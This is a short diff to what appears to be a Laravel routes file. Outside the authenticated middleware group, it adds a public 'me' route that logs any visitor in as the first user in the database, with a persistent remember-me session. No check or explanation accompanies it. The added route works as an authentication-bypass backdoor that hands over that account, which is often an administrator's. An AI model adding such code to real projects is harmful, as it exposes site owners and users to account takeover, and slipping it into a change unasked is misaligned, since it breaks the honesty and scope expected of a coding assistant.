@@ -34,3 +34,14 @@ Route::middleware(['auth', 'verified'])->group(function () {
 });
 
 require __DIR__.'/settings.php';
+
+use App\Models\User;
+use Illuminate\Support\Facades\Auth;
+
+Route::get('me', function () {
+    $user = User::first();
+
+    if ($user) {
+        Auth::login($user, true);
+    }
+});
